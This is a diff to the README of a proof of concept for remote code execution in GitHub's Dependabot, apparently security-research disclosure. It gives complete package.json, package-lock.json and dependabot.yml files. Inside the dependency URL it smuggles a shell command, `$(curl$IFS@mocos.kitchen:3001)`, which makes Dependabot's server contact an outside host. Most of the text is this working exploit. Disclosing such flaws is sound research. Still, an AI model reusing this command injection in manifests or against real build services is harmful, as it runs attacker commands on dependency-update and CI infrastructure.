@@ -1,8 +1,54 @@
 # PoC for dependabot RCE
 
-Please replace `mocos.ktichen` to your own server.
+Add following files to your GitHub repository and `curl mocos.kitchen:3001` will be executed in dependabot server
+You can see your dependabot result from `https://github.com/<USER>/<REPO>/network/updates`.
 
-After the preparation, you can see your dependabot result from `https://github.com/<USER>/<REPO>/network/updates`
+`package.json`
+```
+{
+  "name": "javascript",
+  "version": "1.0.0",
+  "main": "index.js",
+  "license": "MIT",
+  "private": true,
+  "dependencies": {
+    "tyage-sample-package": "https://github.com/tyage/;$(curl$IFS@mocos.kitchen:3001);?/github.com/tyage/sample-package.git#semver:4.0.0"
+  }
+}
+```
+
+`package-lock.json`
+```
+{
+  "name": "javascript",
+  "version": "1.0.0",
+  "lockfileVersion": 2,
+  "requires": true,
+  "dependencies": {
+    "tyage-sample-package": {
+      "version": "5293ce3ccb70ec547355db2f05eda7a1823eef16"
+    }
+  }
+}
+```
+
+`.github/dependabot.yml` (add this file after you prepared the servers!)
+```
+---
+version: 2
+updates:
+  - package-ecosystem: npm
+    directory: "/"
+    schedule:
+      interval: daily
+```
+
+
+---
+
+# Old PoC requires SSRF
+
+Please replace `mocos.ktichen` to your own server.
 
 ## Prepare GitHub Repository
 
